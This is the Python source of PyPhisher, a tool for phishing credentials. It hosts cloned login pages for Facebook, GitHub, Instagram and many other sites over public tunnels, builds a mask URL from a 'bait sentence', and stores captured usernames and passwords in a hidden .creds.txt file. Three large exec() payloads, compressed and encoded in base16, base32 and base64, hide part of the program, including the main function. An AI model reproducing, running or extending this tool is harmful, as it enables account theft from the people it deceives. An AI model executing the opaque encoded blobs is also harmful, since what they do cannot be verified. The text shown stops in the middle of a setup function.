# -*- coding: UTF-8 -*-
# ToolName   : PyPhisher
# Author     : KasRoudra
# Version    : 1.9
# License    : GPL V3
# Copyright  : KasRoudra (2021-2022)
# Github     : https://github.com/KasRoudra
# Contact    : https://m.me/KasRoudra
# Description: PyPhisher is a phishing tool in python
# Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 40+ other sites available
# 1st Commit : 08/08/2021
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : Zphisher, MaskPhish, AdvPhishing
# Env        : #!/usr/bin/env python

"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
"""


_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'AD1C0C4EF1BEBE3E1EDF8A012CD89627107D136614DEDED3BDC3E6C1BCC64F11D3CC83F0B0E9B379091F699E698EF2FF8DDEE07DEDDCFE56C2EDB5D114B7727587FA56C5B9B3249C0B05EC20BDD160AD7F1A77ED50AB39F880F17373A3EB1E264FDDE7B2B3EE47E7EBF211B75B89D17FDA99E5B583D8B56032D9E63F8E0EF7169F812FEEE92B3B14AA739D00E0842D7C227E7DD7070B2C9E451456BECBC8628E077C7AB4986AAB5D88515D14D5BA233F79138BD518171A76BBAB48D3D60582A54C9E3FA47CC8ED262C643C0B7DB726DE64D5A8DA60F479BD12C274CDB1898CA8D3EE62B5A762690EBD024FC91863118684143483FEF4D60AC9A8D6639683B39C8D0B95A3F9ACAFFDD17C1A5A93A0BCE04BBABA3C69B49745268B3DE43A105BBAA9E904CEF64C9600455E0B9DDB90E0DF4253D1F4F30058A2251733F3F697A841655F5E0FB049BF2979288AC3D08455AD616BF60D8CF44AF5E57B152148448940FA329659FAE40F6502663CAC0B03BC1EEE2E5A9EA3BBA0A7E24249093CA2B74F453748A5E9DD7AA247B175D7D2E3185533F067F5D523282098D8078528A3C1EE48B13CF61ADC8440DD828738587EEA105F158A08CEE97FC903FEB908CBF7F7E3EBFBF9F9F3FEFD7F3D4E28F21858CF12A4FBE17827D220D8C7A12D2DDC764639F834C01385E69429D1C987'))

# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.9"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

logo=f'''
{red}  _____       _____  _     _     _               
{cyan} |  __ \     |  __ \| |   (_)   | |              
{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
{green}         __/ |                          {cyan}[v{version}]
{cyan}        |___/                   {red}[By KasRoudra]
'''

ngrok_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://ngrok.com
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://dashboard.ngrok.com/get-started/your-authtoken{yellow} and copy your authtoken
"""

loclx_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://localxpose.io
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
"""

modules = [ "requests", "bs4" ]
tunnelers = [ "ngrok", "cloudflared", "loclx" ]
processes = [ "php", "ngrok", "cloudflared", "loclx", "localxpose" ]

try:
    test = popen("cd $HOME && pwd").read()
except:
    exit()

root = popen("cd $HOME && pwd").read().strip()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

for module in modules:
    try:
        import_module(module)
    except ImportError:
        try:
            print(f"Installing {module}")
            system(f"pip3 install {module}")
        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)
    except:
        exit(1)

for module in modules:
    try:
        import_module(module)
    except:
        print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
        exit(1)

from requests import get, Session
from bs4 import BeautifulSoup

websites_url = f"https://github.com/KasRoudra/PyPhisher/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 

websites_dir = f"{root}/.websites"
dir_templates = f"{websites_dir}/templates.json"
templates_file = dir_templates if isfile(dir_templates) else "files/templates.json"
email_file = "files/email.json"
error_file = "error.log"
is_mail_ok = False
email = ""
password = ""
receiver = ""
mask = ""

# Check termux
if exists("/data/data/com.termux/files/home"):
    termux = True
    saved_file = "/sdcard/.creds.txt"
    try:
        if not isfile(saved_file):
            mknod(saved_file)
        with open(saved_file) as checkfile:
            data = checkfile.read()
    except:
        system("termux-setup-storage")
else:
    termux = False
    saved_file = f"{root}/.creds.txt"


# Check if sudo is allowed
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo = True
else:
    sudo = False

# Check if it is mac and if tunnelers are installed
if system("command -v brew > /dev/null 2>&1")==0:
    brew = True
    if system("command -v ngrok > /dev/null 2>&1")==0:
        ngrok = True
    else:
        ngrok = False
    if system("command -v cloudflared > /dev/null 2>&1")==0:
        cloudflared = True
    else:
        cloudflared = False
    if system("command -v localxpose > /dev/null 2>&1")==0:
        loclx = True
    else:
        loclx = False
else:
    brew = False
    ngrok = False
    cloudflared = False
    loclx = False
   

print(f"\n{info}Please wait!\n")


_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'===Y7XQKNYB4776VDX7PHERXNLZRK3A5VQ4AQFD2IGYDLEVWBOGIUTEXYGQCDQPCHIRNPTCYYAXOD33F2DN7IYI6WQTR7IZS5BGU4Y4A3ZMGE3PIMZ2WJGVWFUMNSA2L673ZYQMRSQN53ZRD7C2ADUFNRDV3CO64FPQ2Y7UDDGCJXE2NGDB5O5EFGSYQE6N3I5OQAUMXGE2BE6XVXGUSFR75RUE3FCRKX4OCJVUWYF4II3AAQLDGASUUEACMQUJDATU6P7R72GUQ2TUZSQ27YCIVMI76HSMZBDOULDJ5SVQC4YNSNIJ34BYGW3LNRN4MT2XOLTQT3APKIZ7LZEGZ3CLK45OJVDCOX6H2EP6UIOQKSRGKK72PBZWMZVKZG6GZLO63XR7KRTVMXFBNAOV434LIVEGLAQB4NYRWL7PJMVMYFMVFFNJHDW4Q3W5JAHRW5EKFOVTGGTXC77GME7BNXRC7IJRSSKIQSNVAHMWINBAHOAGN7ROYMZ6XL6FBY3UXZMVO53S3B5A2LMKIQCLAEKUWHTJZWP7XQK4CDIJCFU4JH2VIYYLU74RPMY3STCECSHMV63PAYJHGLCMMTV4CRR3D7REG7IHMLWPJFRXHHNLFQD2EUVBLBCSL7HK6IFD4EJSMTWHAIYCH25UCGQ6V4ASDUKAVZ7KKLAE6GZIXPQFX6OVBI435KYSCLWNOAQEVB6VNYYXDZHQVLDY65LXCAZRR7HLZASPPTROEUCGERCSOFIW76OQAVZFAKRPA25HHPMDWLD2YUJ4JV4PRTRISGIOTBHQZ4Q7RHDTTWFUOMIEAWQCYE32IYIRI22L72L6TFPB7RNDVT2T5GX3E7KVGW7VJDRKB6TC35AEZOKZJKBJXDA6CGFGIY3RW467XH5JQCIRLAIPGBXIZCMYSACPHE36AV7OSHXD56Q4IUHCGXJI544OGXE7LRAHQGOW24XT6RBYPTJBS4V43FUN3AVLQIYYQDOIZ3FBD744KYT2KI5GOCQVEX4NDMP5H4ZPBEAMGNJGYDQYJISOVIB6FQ7WG7SL6MBDS3W7LBSS26AXJD4RM2VEBYZGWI4QUX7TAUXGCM7KHL6J6I5IJXUURP4AYNFHFAF2AK6KXZW33TXY4WJBCHBUNO4372Q6OSJJZTLDXQ7XUEXTE2M25MEIGW7Z5EM22W2XDLS7QX5GPLZYBXIATLHTAYKK74XZ5QQJ6R364ZVUSIKUAOPMRZ4EREALFYK2GBNPHTG6GJPI72SVEPJ32WWD36F7IG4SQVTYGTAIKQH6YS6QKE5W2X4RPU2OV666JLVRA4IQ3PKK676XHXSBPHOD4UC72MJ7AQMYWRUO4WKM7GC42U34HT4YDH6RXX5HXILXUIEMDPDQQ3PNR2EHUVRNRV4H7HV5R6XCKT57GHGYHXZQB47SG4XC35SZEIGSP3HILKU7GLFLFYO76HXU4M3POTACCURBSHSPYUNALJOQTW2D5EKXCB3NUMNFCWQPBBSADYFJPEO4TRBPCU5XIGDQA6BHYQASRDY5C5PAF3UIPV2XVQEJSCRZDSIKO7GXK4EVYTFBPGBRWNIFU3RJWYIMAVL3JIDZPCKB7OCDK5FYQD6UHB6OZDWTPCUTO3QZ2PLXPBAEVM7B7JQTNQOM2EC3Q6GJVB7VNAIWRC7GAAPVGUWCVPIPFQCK463ZO3JOBJYPY53FEGE5DWEG2TB3GMNWWDBPUVZTADANVQVP2VHOY2T22ZGJGQ2SPHE6OXWFREIBDDOIVNOGFWWYBKJBEFNCTZJHBWCQ6RQV5NXVRPZS4L34LLETC5FIGVB6M3KJ5C2W5FRHCQBIPZ6UMMYS7IGRACBQ6KAX323NJE3PQWMI6G5XAJHUX2COQ4TQQAL7XVKUDXNBVA2B2EZKHGECC6KLJBQDVR6Q3AYSAG2FPA6O2VTOHECEWRVD4LXZQEV4OB77DSJO22VRELPA5HP7DOLGPQ44PLLRHTLA232FR3FWWWW3A7EOYVQBLGMWL5VTBAB6WYJXUODR4S5YEDJ7G7ONDUSJ47KJREIVS5EASAMEPLJYF74D6YNT43XDW3Q5WMSJIK2TPN54ITZBTPVZWSPEMQWMFIKJHOFE64UTU76JINEPQFD5ZL7SP7MNEUA4DFDBQS5UJTXFHSJL63ZCKBLZ2BNSVO2WUZG436DV64DRUBK5XPYX2TRKX4XBETA7PJIYOMXRIK7OY3GH52HJ6GWVBCY3FSYXDDK2RCZOZ6J6HHDIOOHUJPPUQJ57ZMBE7P5IHUB5TPARDA6JU7OSNM2FLSCRB4HB5CU5OUEXXL46IKGBQ2FZJ24PQOYC5MBCR4ZQOI26VAFIWD5KHWXD22J4NKLYUUPD3OLJZPY5V4C5SMOF22C6DWXVPMVRBVFIF5K4MJAUZOJA2HZBR6TNBIDQ3AGJ36NV2J5WSPB45GC5TL3OZBHARV2OTTWYT65A2Y7JJP7B7XD4S3YRX4CZUSMMEORVSHKSMGRYRVGF64TT4CAWJZILIPDPS3ZAY5PENPFIOISV74UDSOIZFZGZGEKVQJG2FUL56AQ7W3LTTID6FTZH54M422PH4PFXRIZAYRK6T5ZTHQCJ3IWNBOCHDYOJWUEG2YYTWPYJJOPDHZISMZOQJYZZETRRGG424KUORYODAETBQBZPTAASNPJSWBQQT4YDDS7YXLCMS66JXWHMJFM2EOGYCWZ6F26MSBFFA4FKCQZOUY73IKQMMWI374LDULJRYVDXS7LBUPQ5C5KOD4IX4PYB7VNJLBSXPLAMLJ5EIG55SSSQD4GS6BTPG4LK5GL4Y2LYJ2GRCDHUQRD25PPDEGODULRICVEZBAZND6O6XJFLXIWZAXQZOQMAJPECJOASKNIOES3SIOGZGFR3OEZMH6IQ6XHW3AFQP4E3PGN2CFW4QS3DIJ6TTGAMM7BA55J3LFVZP3MHAURSXH55DGZGTCE4XXXEPGR3ITTV3UXC2TESCDIOQTADLNQ5FNCZK6YLIPRHXXVEJYM342XOR6PCWGSPZLLPIOXF4ITXLD5AE5JXJOCZ5V3BIESVKMJALGRG5LQOYOIKUKEAQ5ELHSBATBKZZMPZJFSJRKWLCWASIOHIOI3M7MLDFDUQICDZ3WQTAT2M6GX72W44GJL42AJDHKT42NP4QJH6GZVG5LYCSRDN3BUL7O3HEMXSYII2ROYRF7NOHVLNJA6RLWIG6ZA2AFWBODNVCBX552QAU66JYAJ4YYVO7VFJXFZSKE2GKKC46AQZIWAKRRKRGSR3UQN5FAZPQWEDA4F3ZTL2QPEFATGATITH2AJYUCU67FM3VW3ITXV62Z2VBYGCOVYKL64RJZXPWW3WHZ2ALLCWYDG5GMYPGL6VCBWSMRQNRAJIMYYNHAZIKIGOJ43NHHIL3E7VWB4EESPRXRPETLLFVFP3OQXZLFA4WK7IE45UBRXBEIUYAI67VSCN4Q7NWCYFHQNSA6U4J4SXBGJ67CJFQEY4R23AEVD7M7C47ABE2GY2Y6CMFWHZZYEHF3HKYXJRATDQYBL6H6PRYVNY75SQEB546JYN22QEB4IROQP5Q64QK2WOISYU2L53WMSHMWWA6KM45AF5IBH6EWHWUOAEZ6KKNQR6WZJFVZWISNKNHKYAU55WSR4PAO7IJ6PNF5233UOQZOTWFOP7XZMRI6CCZEHH7EQJ5GJM2FXDL63TEZTZ633U4YESG3OAE36JO7URSI6D6EXNBOVSSLCPBUGMTAFPQRR66LOUUFVDBAFNXASDMNAJTI3XNMRLS6YW64Z7LSZOZSQ6G2OIOUBWUQTDY6CW64NHD53QVOBNAPBKGE2IDVKFDDRNXDMBUN455F7DRGXHNKJYB47BFKZ6AIPFQKUT5NWEQ6SYD47ALORT2JAJH6WREGGWNC25C5YGJG2O7BKGZSROAVCT6DR4ETFMADCRXK2D7PWHZ7JYBPEIVIKMM2LL3F3HMSQ24HCDB2ZTJE3A352YKEYB5ILJLYSUQWE7GN4HEEUSN6RV4ZQQTEVWHOFAV7Y5QSCZMOPEZEKEJA2QDVGC4SPXOUNDUERY7NSMZSDRVJX32Y65OK6IZGOYHVP45VBR3QLHQAZP3HCMH75HXSBDT7UYMPFHWKQACFOIT33H643E7E55DBERRZAV574SAYFXSFGNVW6PBRUOS6VUHRW3JJUI7OVBM6DYHS4NC5GZ3USL3CUN4T3MRX5YPEGDNMX4RG4MK2F737Y7Q5UEVHH7MOFHBGZ5JG5EDTKMAC2EYZTC7436S4A232ANNCMCUM4THJMD3ZTMG5KZHXTJAUA47MQJHXX3XOUERMRJ2TG2P6Z74L3SKOMWFJRQLWCR5ZU7LSNZADN73OWH4LSL5O7CLYBSWDFMNTG64CKTF6I6M3QSQHGW5DH6YJSNE72LGZCMV532W7Q2OPWOHLVXU63NQRH4ZFQIZ2NXXXHWXUDRVUD2PFT6CPEL3TH6SYYMUGXSLRGZUPFV5E2HJW2CY4PYZSOF5TGHCOGBMYKGPEMYXNHG4JP2BVVVU5H5NRJBCXR7645UMWOYRWLUPXTNR45DGL4QJM43CTWXAIBOM3MQEN4BZNJ5YHCI2MGZOFV3GONV4RO5Z5MUI3C3IKJEYQD5IAXFFAAVRT2KEDD7W5ZAZ4BKP745Q2YBKOBZ5HAYZ3DC4IMCWZLUU7V2MFMQCPMQLTL222YL52U7EJWA4U4SETL4O6ABZZ3YVE7ZCZYU4AUZBJLIAJVEPRI3D5LYPLUPLOZNJC52KBWVKU4IKGSXZKZBW3ZWSERPXDC56YD2V4DOUYRA2MARTOR7ZOCDLAT4VUEP54ED6UBSM667UK3NH6EJNY6OPPSLM2QG6ZRHD2533UVXFEC6EHORW354N6MKBS4JGYKPLYEWN57RWC4NLSTXSUKU2WBSC6FJSX55USZ2DDNXK6LH4ENI6TUNO434ZJ2PVFKQZ7XZ36DQGIL3IFHBQHU4TZ2RG44WOFW4S6AS4ZD7VQPHSPIYPOII6CDQHPIVLC75FWUQ266PYAGP5XBXTNU6RUG43CIXQH2X3E4HGFH37TJOZWF3SX5Z7HFMSCJ4KBPFS4Z6D5WVEGELR22LT3XIZ6YQONKRSCGC2FKVFIYGQ4IPHZEGCVCQGLTPPOES5GSD2QHQCEXCJZWAPZPNFYSEJOMYZXJ4BGZQJACXMAL7RDENY6ZUZTSL42XLG6KCTETZ2BDQ7IZ36XJIXGYE5HPB6CN6LB3YYK2YQN7MPV3GCZ6XDPIPI2OYJX72QSBXES55JJURVKNZMFJKUDFPRVQZVQIOZCVC5XEQ2GJ25TWT5K76KLOOPV7JJ6WGSDONVMOC54Z3NJFN5T2O5MGD4PVH5WY6RG552XI5XY6C6VXGWFOGXTJVWNEBSCP6DJROHNZ3BBD6WZ5F7O3BG4ZATWLTI6JIINIBRH2HUWZ4CBH7DUGDX4B6C2723RKLE6XP3UVO3NXRFYU3EOHF74YCNI7PR5OQTY4GFHVCTY6J6Q5BJ6SO34NZT7ZOL2JR2EB3BGRQNYM5U4U6XWNNZPHL2DJING2PK4JRDGNBK2HCB74VULCVGNLMRHIESQLP2PJGG4KJLR2GZM7JSTULEJGAP5HIKY3V2LVK7EPKL34G6B5VBWNO3YWO75NP7DXWRYC2WGXVE4CXAMFNMFTLF3EDK6QTLCGXW3KHDZ2S3ERPIWDWDCXPBBK34DMYKBX5KQSJWPPZLRRJZVG5O7K6IV6NEQU4GTQ4AFQ5M5YJNGT54QVYD7RZNNKAXO4Q2UIYRFJ3UALNY6UL4M2PMMXU7RQCFY7WELMECSY3N3POTU4IL5Y3D52TCYPIIRK5EKVBNTU6ET2OHRNYZ67LYFDV7J4YRWVMUKF625D7OVDCTIQ2R7Q3RPUWLCVJ7C3YHBHQ2WCZQHR3WLOO4OGDGBRWFH2R55UD3W3PFT74LKWQ32PNPCLU6GMFUXEFGEVJPWRNDXCLLHJYADDN7NNYLMVNQX4II4SJKRWGK2TXE37ORMY4QX4CRNWIT7PJQ65NTM5GHWIZHJSIUXMVHT623K3TLT74PT6PERT76VFAFG63K44AKPESHNL4IHEDZVPVG2IMUZUABIT64LX7CW42DI43SPZSB3EHZVRKMY4KHHT6VDREVLDKOI3C6IRDKUE2WZXOPVVLSPDF6GV24WX3H3NG2KVFBHPG27YVRYV7X3A4OOWOHZDEW77OMHPD3PIVUWTTK7P7UUPKQQ6ANM2LWST63W2M34OI2QN4ZW6GRJE2TEUKHZL7NMBB2Z73243TUIIVA2QTGYQFD6IZD2P2MVOMMMZ3NN3SGJXU4R6R66KBR3UHWSN6SRXCQOU3WDJM4FCNAHSEK3PCLKIIYZF2DTDR2E7423ZL54N6US3MI7LECKVVLLSX3T6F3VXE7E27NKXXDX5P6Z34WP5OF7WLYM6DOI4I7I3XFTM6VXRWZZ5S4ZUO7WMNNEXOD4EXULAG66WI33U2H47TZFWECM4R6DNDBMJRLJJ52PQVVWL4GDM3LCX2QYZR3JCHPQ5QWPF5R3RMP44GZOHUKMIYSBRMIXUMQGJD6UCOHABWKFK3UNGOL4ZPHKCTMGESRR7FYN3I6T7Q4NG7CHVUOINEN2OVKMBMENFPW42E4XX5K2A7ORIEH7OPY652X6B764Y2MOC3K63XOZY2S5IGMJIBJWMZC6V4P765D777PP62V777TH7457753T77ZV3HXPNE3S7CQAGY6AP3PZ2DUWEAATUNTS6ER3BFAYKPDR5UKVJ5SFKFQ3C3NJCG3BOCP'))




# Write/Append errors to error file
def write_error(e):
    with open(error_file, "a") as error_log:
        error_log.write(str(e)+"\n")

# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)


# Install packages
def installer():
    for pacman in ["pkg", "apt", "apt-get", "apk", "yum", "dnf", "brew", "pacman"]:
        # Check if package manager is present but php isn't present
        if system(f"command -v {pacman} > /dev/null 2>&1")==0:
            if system("command -v php > /dev/null 2>&1")!=0:
                sprint(f"\n{info}Installing PHP{nc}")
                if pacman=="pacman":
                    system(f"sudo {pacman} -S php")
                elif pacman=="apk":
                    system(f"sudo {pacman} add php")
                elif sudo:
                    system(f"sudo {pacman} install -y php")
                else:
                    system(f"{pacman} install -y php")
                break


# Process killer
def killer():
    # Previous instances of these should be stopped
    for process in processes:
        if system(f"pidof {process} > /dev/null 2>&1")==0:
            system(f"killall {process}")



# Set up ngrok authtoken to work with ngrok links
def ngrok_token():
    while not isfile(f"{root}/.config/ngrok/ngrok.yml"):
        token = input(f"\n{ask}Enter your ngrok authtoken (write 'help' for instructions): {green}")
        if token!="":
            if token=="help":
                sprint(ngrok_help, 0.01)
                sleep(3)
            else:
                if ngrok:
                    system(f"ngrok config add-authtoken {token}")
                else:
                    system(f"cd $HOME/.tunneler && ./ngrok config add-authtoken {token}")
                break
        else:
            print(f"\n{error}No authtoken!")
            sleep(1)
            break

# Set up ngrok authtoken to work with ngrok links
def loclx_token():
    while not isfile(f"{root}/.localxpose/.access"):
        token = input(f"\n{ask}Enter your loclx authtoken (write 'help' for instructions): {green}")
        if token!="":
            if token=="help":
                sprint(loclx_help, 0.01)
                sleep(3)
            else:
                if not exists(f"{root}/.localxpose"):
                    mkdir(f"{root}/.localxpose")
                system(f"echo -n {token} > $HOME/.localxpose/.access")
                break
        else:
            print(f"\n{error}No authtoken!")
            sleep(1)
            break

def saved():
    system("clear")
    sprint(logo, 0.01)
    print(f"\n{info}Saved details: \n{nc}")
    show_file_data(saved_file)
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}99{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        main()

# Info about tool
def about():
    system("clear")
    sprint(logo, 0.01)
    print(f"{red}[ToolName]  {cyan} :[PyPhisher] ")
    print(f"{red}[Version]   {cyan} :[{version}] ")
    print(f"{red}[Author]    {cyan} :[KasRoudra] ")
    print(f"{red}[Github]    {cyan} :[https://github.com/KasRoudra] ")
    print(f"{red}[Messenger] {cyan} :[https://m.me/KasRoudra] ")
    print(f"{red}[Email]     {cyan} :[kasroudrakrd@gmail.com] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}99{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        main()
        

# Copy website files from custom location
def customfol():
    global mask
    fol = input(f"\n{ask}Enter the directory > {green}")
    mask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
    # Remove slash and spaces from mask
    mask = "https://" + sub("(/| )", "-", mask)
    if exists(fol):
        if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html") :
            system(f'cd "{fol}" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site')
            server()
        else:
            sprint(f"{error}index.php/index.html required but not found!")
            main()
    else:
        sprint(f"{error}Directory do not exists!")
        main()


# Update of PyPhisher
def updater():
    internet()
    if not exists("files/pyphisher.gif"):
        return
    try:
        git_ver = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").text.strip()
    except Exception as e:
        write_error(e)
        git_ver = version
    if git_ver != "404: Not Found" and float(git_ver) > float(version):
        # Changelog of each versions are seperated by three empty lines
        changelog = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
        system("clear")
        print(logo)
        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
        upask=input(f"\n{ask}Do you want to update PyPhisher?[y/n] > {green}")
        if upask=="y":
            print(nc)
            system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
            sprint(f"\n{success}PyPhisher has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

# First function main

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'6teFk9h///7z5rmXvhUlsjuzH/S6+Jcpk3LLLBoPherwYSiE/UumtpbwhHs/60dbIxvfT6joY0GhqtagaqkDvMQlKir01/5vEzsyuRipgvM2buijZWiaGNcJtuklDElp5x6QPJz2LbNV/MzLCmMUnNXVvm06bKGCjFPyULt+5rrZrDcFXK2TkiEo/iV9j4pDAPHM+J1dREwBGCSke7FfJlWL+nkPdGr+GHdReqQyGvzpDNye53vIBx/i12UVisCs7Xrh03RVXjJUkmJqfuPEyBPuB6Xrbj80HtMTqtrIZWrl7Sxrxc14M+os+q4PquTUmF4FicYTmoDuQfh2z17OYSueyHA2y+KIQmPgOKzRhuWKYRAQxtibBXkvzqqfbTXlZUTqD1bt3l/XqTGkK+FeiDiHKRohngpxuTIU5hJY7FOa4KL5DG71cIT6ZwOlBjiIUYOJ5pLFvVqGQCbqHci1+tOMSO+B3VFSZ8jIIP/iEX3vgz5QlbHPvVKQ9ms+LEI14K19+VHnGc4PYkjVc14Z3pD778th04YN3qGfXJeWu4obW7CwteZGp8eNDaq0Yp0NIzorJXEvkSSVEQMeXXhZo1dyaLSyVhu67/2UfE1QtwOnB1wBP/KO5++YSi/Wp+iqgcE45WOxAFzbVmY9/un5kN6gTn86z2usaD9QkXX6GV9u+7y+cnR0hJA5yf41yURxUVarUM49Jy5O7cpFqpp25t84+P9P8qd3SuAKduc534DoPO02UEaCBgmQMz7pTwYrV3aMa/2yaIGPnd8srUiooepcBrjaGI81fQ7/OiQK35FhV087edO5835u9k/i/9CcpVo0K4IxLa0YUjuAxJJETgzO3kZjvpcN+wFhq3IuDHphpuDQXk6/GXm9bOTgxaAVtqMdbLYee3gPEnvxBl/TPltCe7iSDRVyMDFPcfjrkccI4+Ko4MGUjLq5izx4PACBMNE2oHiU7tvUvDfCYrqT0d81JYzfQKsDHNC0mpUpqC1y2ap3ALLfLnKh1o0vqu0bK7bdJiug5CizFXyX3+0rtSwZ+lONZ/8FafApbJ29OtBtxvR5rC8pgUpPvWXGPpmRw0MhFt/J2haBmKAu0OVPmgUBur6ZX9zo+5HhfD6rlxaE11SZsDXLdV7oCaXjaQH9bVzKdNQBMPgTqHLJdMq3xpAxbK/dT2CDKubUXAZatkjXEA1TTfnkXXoLkwpTtFnvzIe0vHX1RKMF7dCoXVh+wEI1llr/iqhbN7lqJsowRXBGmV6aiXOutg4viN6o5MF8ebNMWbtuML2Wz9bVuwIMsfXJHofBY8mAYUnzEk8aLPaaGXQysvTFFyo7svqdlSKqOHJHzR0CH716q5SkaeKntkXux+0eLqTHJA/S/3Wq2rq6yfPe+yojgEh3YhIJ5fiUGfcx95YVMrLUhYE4Xt66TS4pz9kw/wOot4ZFeLGGhlD+NX/j77/fy/3vfnP/+zyuK3n865lf+yRLxBnFkdLcnCA6k0CALed6PHNQCgFrWUL1NwJe'))

# 2nd function installing packages and downloading tunnelers
def prerequiments():
    global is_mail_ok, email, password, receiver
    internet()
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            sprint(f"\n{info}Installing proot{nc}")
            system("pkg install proot -y")
    installer()
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(f"{error}PHP cannot be installed. Install it manually!{nc}")
        exit(1)
    killer()
    osinfo = uname()
    platform = osinfo.system
    architecture = osinfo.machine
    if not exists(f"{root}/.tunneler"):
        mkdir(f"{root}/.tunneler")
    isngrok = isfile(f"{root}/.tunneler/ngrok")
    iscloudflared = isfile(f"{root}/.tunneler/cloudflared")
    isloclx = isfile(f"{root}/.tunneler/loclx")
    if brew:
        if not ngrok:
            system("brew install ngrok/ngrok/ngrok")
        if not cloudflared:
            system("brew install cloudflare/cloudflare/cloudflared")
        if not loclx:
